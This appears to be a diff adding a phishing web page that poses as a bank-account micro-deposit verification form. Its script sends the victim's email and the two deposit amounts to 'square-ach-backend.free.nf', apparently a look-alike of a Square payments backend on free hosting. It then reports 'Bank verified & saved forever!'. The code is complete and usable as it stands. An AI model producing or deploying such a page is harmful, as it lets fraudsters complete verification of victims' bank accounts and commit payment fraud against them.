@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Micro-Deposits</title>
+  <style>
+    body{font-family:Arial;max-width:520px;margin:40px auto;padding:20px;background:#f9f9f9}
+    input,button{width:100%;padding:14px;margin:10px 0;font-size:16px;border-radius:6px;border:1px solid #ccc}
+    button{background:#006241;color:white;border:none;cursor:pointer}
+    #status{margin-top:20px;padding:15px;border-radius:6px;display:none;font-weight:bold}
+    .success{background:#d4edda;color:#155724}.error{background:#f8d7da;color:#721c24}
+  </style>
+</head>
+<body>
+  <h2>Verify Your Bank Account</h2>
+  <p>Enter the exact two deposit amounts you received (e.g. 0.23 and 0.47)</p>
+
+  <input type="text" placeholder="Email used when adding bank" id="e" required>
+  <input type="number" step="0.01" placeholder="First amount (e.g. 0.23)" id="a1" required>
+  <input type="number" step="0.01" placeholder="Second amount (e.g. 0.47)" id="a2" required>
+  <button onclick="verify()">Verify Bank Account</button>
+  <div id="status"></div>
+
+  <script>
+    async function verify() {
+      const email = document.getElementById('e').value;
+      const amount1 = (document.getElementById('a1').value * 100).toFixed(0);
+      const amount2 = (document.getElementById('a2').value * 100).toFixed(0);
+      const r = await fetch('https://square-ach-backend.free.nf/verify', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({email, amounts:[amount1, amount2]})
+      });
+      const j = await r.json();
+      document.getElementById('status').style.display='block';
+      document.getElementById('status').className = j.success?'success':'error';
+      document.getElementById('status').textContent = j.success?'Bank verified & saved forever!':'Wrong amounts – try again';
+    }
+  </script>
+</body>
+</html>
